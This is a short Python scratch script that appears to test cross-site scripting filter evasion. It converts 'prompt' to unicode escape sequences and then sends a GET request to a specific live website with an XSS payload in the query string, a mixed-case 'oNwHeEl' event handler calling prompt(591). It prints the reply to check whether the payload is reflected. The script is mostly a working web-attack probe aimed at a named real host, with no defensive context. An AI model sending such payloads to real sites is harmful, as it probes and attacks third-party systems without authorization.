for s in 'prompt':
    print(hex(ord(s)).replace("0x","\\u00"), end='')

print("\n")

f = u"prompt"
print(f.encode('raw_unicode_escape'))

a ="'"
print(a.isalnum())


import requests
r1=requests.get("http://m.cndits.com/product/visa/lists/zone_id/930400?var=<A%20oNwHeEl=prompt(591)>591</A>")
print(r1.text)